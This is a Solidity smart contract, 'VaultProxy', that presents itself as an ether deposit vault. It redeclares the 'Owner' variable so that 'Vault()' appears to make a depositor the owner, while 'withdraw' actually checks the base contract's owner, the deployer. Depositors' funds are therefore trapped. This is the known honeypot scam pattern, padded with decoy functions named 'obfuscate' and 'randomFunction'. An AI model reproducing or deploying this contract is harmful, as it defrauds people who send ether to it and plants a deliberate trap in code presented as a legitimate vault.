pragma solidity ^0.4.23;

contract Proxy {
    modifier onlyOwner {
        if (msg.sender == Owner) _;
    }
    address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner {
        if (_owner != address(0)) {
            Owner = _owner;
        } else {
            revert();
        }
    }

    function proxy(address target, bytes data) public payable {
        if (target != address(0)) {
            target.call.value(msg.value)(data);
        } else {
            revert();
        }
    }

    function obfuscate() private pure returns (bool) {
        return true;
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable {
        if (msg.value > 0) {
            obfuscate();
        }
    }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        } else {
            revert();
        }
    }

    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        } else if (msg.value == 0) {
            obfuscate();
        } else {
            revert();
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && Deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
        } else {
            revert();
        }
    }

    function randomFunction() private pure returns (uint256) {
        return 42;
    }
}